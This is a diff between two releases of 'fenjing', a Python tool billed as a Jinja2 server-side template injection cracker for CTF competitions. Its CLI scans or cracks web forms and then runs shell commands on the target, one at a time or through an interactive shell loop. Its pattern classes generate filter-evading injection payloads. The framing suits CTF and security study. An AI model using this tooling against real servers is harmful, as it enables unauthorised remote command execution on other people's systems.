# Comparing `tmp/fenjing-0.1.7.tar.gz` & `tmp/fenjing-0.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.1.7.tar", last modified: Mon Apr 17 14:08:29 2023, max compression
+gzip compressed data, was "fenjing-0.2.0.tar", last modified: Tue Apr 18 04:25:34 2023, max compression
```

## Comparing `fenjing-0.1.7.tar` & `fenjing-0.2.0.tar`

### file list

```diff
@@ -1,25 +1,25 @@
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-17 14:08:29.858000 fenjing-0.1.7/
--rw-r--r--   0 user      (1000) user      (1000)    16725 2023-03-31 12:04:28.000000 fenjing-0.1.7/LICENSE
--rw-r--r--   0 user      (1000) user      (1000)     3991 2023-04-17 14:08:29.857000 fenjing-0.1.7/PKG-INFO
--rwxr-x---   0 user      (1000) user      (1000)     3553 2023-04-02 06:31:23.000000 fenjing-0.1.7/README.md
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-17 14:08:29.856000 fenjing-0.1.7/fenjing/
--rwxr-x---   0 user      (1000) user      (1000)      198 2023-04-16 05:52:30.000000 fenjing-0.1.7/fenjing/__init__.py
--rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.1.7/fenjing/__main__.py
--rw-r--r--   0 user      (1000) user      (1000)     2476 2023-04-16 05:52:51.000000 fenjing-0.1.7/fenjing/cli.py
--rwxr-x---   0 user      (1000) user      (1000)      637 2023-04-02 06:25:33.000000 fenjing-0.1.7/fenjing/example.py
--rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.1.7/fenjing/exceptions.py
--rw-r--r--   0 user      (1000) user      (1000)     2053 2023-04-17 05:49:44.000000 fenjing-0.1.7/fenjing/form.py
--rwxr-x---   0 user      (1000) user      (1000)     2759 2023-03-26 05:40:10.000000 fenjing-0.1.7/fenjing/int_vars.py
--rwxr-xr-x   0 user      (1000) user      (1000)    38775 2023-04-17 14:07:27.000000 fenjing-0.1.7/fenjing/pattern.py
--rw-r--r--   0 user      (1000) user      (1000)      853 2023-04-02 05:33:58.000000 fenjing-0.1.7/fenjing/request.py
--rw-r--r--   0 user      (1000) user      (1000)      871 2023-04-17 05:49:44.000000 fenjing-0.1.7/fenjing/scan_url.py
--rwxr-x---   0 user      (1000) user      (1000)     1719 2023-04-02 05:49:41.000000 fenjing-0.1.7/fenjing/shell_cmd.py
--rw-r--r--   0 user      (1000) user      (1000)     3874 2023-04-17 05:49:44.000000 fenjing-0.1.7/fenjing/test_form.py
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-17 14:08:29.857000 fenjing-0.1.7/fenjing.egg-info/
--rw-r--r--   0 user      (1000) user      (1000)     3991 2023-04-17 14:08:29.000000 fenjing-0.1.7/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 user      (1000) user      (1000)      412 2023-04-17 14:08:29.000000 fenjing-0.1.7/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 user      (1000) user      (1000)        1 2023-04-17 14:08:29.000000 fenjing-0.1.7/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 user      (1000) user      (1000)       30 2023-04-17 14:08:29.000000 fenjing-0.1.7/fenjing.egg-info/requires.txt
--rw-r--r--   0 user      (1000) user      (1000)        8 2023-04-17 14:08:29.000000 fenjing-0.1.7/fenjing.egg-info/top_level.txt
--rw-r--r--   0 user      (1000) user      (1000)       38 2023-04-17 14:08:29.858000 fenjing-0.1.7/setup.cfg
--rw-r--r--   0 user      (1000) user      (1000)      860 2023-03-31 12:05:47.000000 fenjing-0.1.7/setup.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-18 04:25:34.979000 fenjing-0.2.0/
+-rw-r--r--   0 user      (1000) user      (1000)    16725 2023-03-31 12:04:28.000000 fenjing-0.2.0/LICENSE
+-rw-r--r--   0 user      (1000) user      (1000)     3991 2023-04-18 04:25:34.979000 fenjing-0.2.0/PKG-INFO
+-rwxr-x---   0 user      (1000) user      (1000)     3553 2023-04-02 06:31:23.000000 fenjing-0.2.0/README.md
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-18 04:25:34.978000 fenjing-0.2.0/fenjing/
+-rwxr-xr-x   0 user      (1000) user      (1000)      165 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/__init__.py
+-rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.0/fenjing/__main__.py
+-rw-r--r--   0 user      (1000) user      (1000)     3252 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/cli.py
+-rwxr-x---   0 user      (1000) user      (1000)      637 2023-04-02 06:25:33.000000 fenjing-0.2.0/fenjing/example.py
+-rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.0/fenjing/exceptions.py
+-rw-r--r--   0 user      (1000) user      (1000)     2030 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/form.py
+-rw-r--r--   0 user      (1000) user      (1000)     4180 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/form_cracker.py
+-rwxr-x---   0 user      (1000) user      (1000)     2759 2023-03-26 05:40:10.000000 fenjing-0.2.0/fenjing/int_vars.py
+-rwxr-xr-x   0 user      (1000) user      (1000)    38819 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/pattern.py
+-rw-r--r--   0 user      (1000) user      (1000)     1543 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/requester.py
+-rw-r--r--   0 user      (1000) user      (1000)      895 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/scan_url.py
+-rwxr-x---   0 user      (1000) user      (1000)     1719 2023-04-02 05:49:41.000000 fenjing-0.2.0/fenjing/shell_cmd.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-18 04:25:34.978000 fenjing-0.2.0/fenjing.egg-info/
+-rw-r--r--   0 user      (1000) user      (1000)     3991 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 user      (1000) user      (1000)      417 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 user      (1000) user      (1000)        1 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 user      (1000) user      (1000)       30 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/requires.txt
+-rw-r--r--   0 user      (1000) user      (1000)        8 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 user      (1000) user      (1000)       38 2023-04-18 04:25:34.979000 fenjing-0.2.0/setup.cfg
+-rw-r--r--   0 user      (1000) user      (1000)      860 2023-03-31 12:05:47.000000 fenjing-0.2.0/setup.py
```

### Comparing `fenjing-0.1.7/LICENSE` & `fenjing-0.2.0/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.1.7/PKG-INFO` & `fenjing-0.2.0/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.1.7
+Version: 0.2.0
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.1.7/README.md` & `fenjing-0.2.0/README.md`

 * *Files identical despite different names*

### Comparing `fenjing-0.1.7/fenjing/cli.py` & `fenjing-0.2.0/fenjing/cli.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,82 +1,97 @@
 import logging
 from urllib.parse import urlparse
 from traceback import print_exc
 
-from .test_form import test_form, Form, submit_form_input
-from .request import common_request
+from .form import Form
+from .form_cracker import FormCracker
 from .scan_url import yield_form
+from .requester import Requester, DEFAULT_USER_AGENT
 import click
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("cli")
 
 
 def interact(cmd_exec):
     logger.warning("Use Ctrl+D to exit.")
     while True:
         try:
             cmd = input("$>> ")
         except EOFError:
             break
+        except KeyboardInterrupt:
+            break
         try:
             result = cmd_exec(cmd)
             print(result)
         except Exception:
             print_exc()
 
 
 @click.group()
 def main():
     pass
 
 
 @main.command()
-@click.option("--url", help="form所在的URL")
-@click.option("--action", default=None, help="form的action，默认为当前路径")
-@click.option("--method", default="POST", help="form的提交方式，默认为POST")
-@click.option("--inputs", help="form的参数，以逗号分隔")
-@click.option("--exec-cmd", default="", help="成功后执行的shell指令，不填则进入交互模式")
-def crack(url, action, method, inputs, exec_cmd):
+@click.option("--url", "-u", help="form所在的URL")
+@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
+@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
+@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
+@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
+@click.option("--interval", default=0.0, help="每次请求的间隔")
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
+def crack(url, action, method, inputs, exec_cmd, interval, user_agent):
     assert all(param is not None for param in [
                url, inputs]), "Please check your param"
-    if action is None:
-        action = urlparse(url)[3]
     form = Form(
-        action=action,
+        action=action or urlparse(url)[3],
         method=method,
         inputs=inputs.split(",")
     )
-    payload_gen, field = test_form(url, form)
-    if payload_gen is None:
+    requester = Requester(interval=interval, user_agent=user_agent)
+    cracker = FormCracker(url=url, form=form, requester=requester)
+    result = cracker.crack()
+    if result is None:
         logger.warning("Test form failed...")
         return
+    payload_gen, field = result
 
-    cmd_exec_func = lambda cmd : submit_form_input(
-            url, form, {field: payload_gen(cmd)}).text
+    def cmd_exec_func(cmd):
+        return cracker.submit(
+            {field: payload_gen(cmd)}).text
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
 
 
 @main.command()
-@click.option("--url", help="需要扫描的URL")
-@click.option("--exec-cmd", default="", help="成功后执行的shell指令，不填则进入交互模式")
-def scan(url, exec_cmd):
-    for page_url, forms in yield_form(url):
+@click.option("--url", "-u", help="需要扫描的URL")
+@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
+@click.option("--interval", default=0.0, help="每次请求的间隔")
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
+def scan(url, exec_cmd, interval, user_agent):
+    requester = Requester(interval=interval, user_agent=user_agent)
+    for page_url, forms in yield_form(requester, url):
         for form in forms:
-            payload_gen, field = test_form(page_url, form)
-            if payload_gen is None:
+            cracker = FormCracker(url=url, form=form, requester=requester)
+            result = cracker.crack()
+            if result is None:
                 continue
-            cmd_exec_func = lambda cmd : submit_form_input(
-                    url, form, {field: payload_gen(cmd)}).text
+            payload_gen, field = result
+
+            def cmd_exec_func(cmd):
+                return cracker.submit(
+                    {field: payload_gen(cmd)}).text
             if exec_cmd == "":
                 interact(cmd_exec_func)
             else:
                 print(cmd_exec_func(exec_cmd))
             return
     logger.warning("Scan failed...")
 
+
 if __name__ == '__main__':
     main()
```

### Comparing `fenjing-0.1.7/fenjing/example.py` & `fenjing-0.2.0/fenjing/example.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.1.7/fenjing/form.py` & `fenjing-0.2.0/fenjing/form.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,11 +1,12 @@
 from urllib.parse import urlparse, urlunparse
 from typing import Iterable
 import random
 import logging
+import string
 
 from bs4 import BeautifulSoup
 
 logger = logging.getLogger("utils.form")
 
 def Form(*, action: str, inputs: Iterable, method: str = "POST"):
     """
@@ -52,16 +53,15 @@
 
 
 def random_fill(form):
     """
     randomli fill the form
     """
     return {
-        k: "".join(random.choices([chr(i)
-                   for i in range(96 + 1, 96 + 27)], k=8))
+        k: "".join(random.choices(string.ascii_lowercase, k=8))
         for k in form["inputs"]
     }
 
 
 def fill_form(url, form, form_inputs = None, random_fill_other = True):
     """
     fill the form and return keyword arguments for the requests module
```

### Comparing `fenjing-0.1.7/fenjing/int_vars.py` & `fenjing-0.2.0/fenjing/int_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.1.7/fenjing/pattern.py` & `fenjing-0.2.0/fenjing/pattern.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,14 +1,15 @@
 from .exceptions import *
 
 import abc
 import logging
 import sys
 import random
 from functools import lru_cache
+import re
 
 logger = logging.getLogger("[SSTI Pattern]")
 
 '''
 pattern可以根据输入参数生成一个字符串
 pattern可以依赖其他pattern类型，pattern之间的依赖关系组成一棵树
 在确定了输入参数之后，pattern可以生成测试样例以供测试，测试样例是一个字符串
@@ -637,77 +638,77 @@
             self.use(StrConcatPattern).join(self.use(PercentSignLowerCPattern) for _ in range(self.num))
         )
 
 class StrPattern(BasePattern):
     pass
 
 
-class StrPattern1(StrPattern):
+class StrPattern01(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         self.inner_s = inner_s.replace("'", "\\'")
         self.require(PlainPattern, inner_s)
         self.require(PlainPattern, "'")
 
     def _generate(self):
         return "'" + self.inner_s + "'"
 
 
-class StrPattern2(StrPattern):
+class StrPattern02(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         self.inner_s = inner_s.replace('"', '\\"')
         self.require(PlainPattern, self.inner_s)
         self.require(PlainPattern, '"')
 
     def _generate(self):
         return '"' + self.inner_s + '"'
 
 
-class StrPattern3(StrPattern):
+class StrPattern03(StrPattern):
     def __init__(self, inner_s):
         from urllib.parse import quote
         super().__init__()
         self.inner_s = quote(inner_s).replace("%", "\\x")
         self.require(PlainPattern, self.inner_s)
         self.require(PlainPattern, '"')
 
     def _generate(self):
         return '"' + self.inner_s + '"'
 
 
-class StrPattern4(StrPattern):
+class StrPattern04(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         self.require(PlainPattern, "'")
         self.require(PlainPattern, "+")
         self.inner_s = inner_s
         for c in inner_s:
             self.require(PlainPattern, c)
 
     def _generate(self):
         l = ["'" + c.replace("'", "\\'") + "'" for c in self.inner_s]
         return "(%s)" % "+".join(l)
 
 
-class StrPattern5(StrPattern):
+class StrPattern05(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         self.require(PlainPattern, "\"")
         self.require(PlainPattern, "+")
         self.inner_s = inner_s
         for c in inner_s:
             self.require(PlainPattern, c)
 
     def _generate(self):
         l = ['"' + c.replace('"', "\\\"") + '"' for c in self.inner_s]
         return "(%s)" % "+".join(l)
 
 
-class StrPattern6(StrPattern):
+class StrPattern06(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         self.pattern = "('%c'*{})%({})"
         self.require(PlainPattern, self.pattern.replace("{}", ""))
         self.len = len(inner_s)
         self.require(IntPattern, self.len)
         self.numbers = ",".join([str(ord(i)) for i in inner_s])
@@ -716,15 +717,15 @@
     def _generate(self):
         return self.pattern.format(
             self.use(IntPattern, self.len),
             self.numbers
         )
 
 
-class StrPattern7(StrPattern):
+class StrPattern07(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         self.pattern = "(\"%c\"*{})%({})"
         self.require(PlainPattern, self.pattern.replace("{}", ""))
         self.len = len(inner_s)
         self.require(IntPattern, self.len)
         self.numbers = ",".join([str(ord(i)) for i in inner_s])
@@ -733,15 +734,15 @@
     def _generate(self):
         return self.pattern.format(
             self.use(IntPattern, self.len),
             self.numbers
         )
 
 
-class StrPattern8(StrPattern):
+class StrPattern08(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         import re
         if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
             self.require(WillErrorPattern)
             return
 
@@ -754,24 +755,23 @@
 
     def _generate(self):
         return self.s.format(
             self.use(PlainPattern, self.inner_s),
             self.use(IntPattern, 1)
         )
 
-class StrPattern9(StrPattern):
+class StrPattern09(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
-        import re
-        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
-            self.require(WillErrorPattern)
-            return
 
         mid = len(inner_s) // 2
         s_a, s_b = inner_s[:mid], inner_s[mid:]
+        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", s_a) or not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", s_b):
+            self.require(WillErrorPattern)
+            return
 
         self.s = f"dict({s_a}=%s,{s_b}=%s)|join"
         self.require(PlainPattern, self.s.replace("%s", ""))
         self.require(IntPattern, 1)
 
     def _generate(self):
         return self.s % (
@@ -823,15 +823,15 @@
         self.inner_s = "".join("\\u00" + hex(ord(c))[2:] for c in inner_s)
         self.require(PlainPattern, self.inner_s)
         self.require(PlainPattern, "'")
 
     def _generate(self):
         return "'" + self.inner_s + "'"
 
-class StrPattern101(StrPattern):
+class StrPattern13(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
 
         assert len(inner_s)
 
         self.inner_s = inner_s
 
@@ -857,15 +857,15 @@
         ])
 
         return self.pattern.format(
             self.use(ManyPercentSignLowerCPattern, len(self.inner_s)),
             numbers
         )
 
-class StrPattern102(StrPattern):
+class StrPattern14(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
 
         assert len(inner_s)
 
         self.inner_s = inner_s
```

### Comparing `fenjing-0.1.7/fenjing/shell_cmd.py` & `fenjing-0.2.0/fenjing/shell_cmd.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.1.7/fenjing.egg-info/PKG-INFO` & `fenjing-0.2.0/fenjing.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.1.7
+Version: 0.2.0
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.1.7/setup.py` & `fenjing-0.2.0/setup.py`

 * *Files identical despite different names*

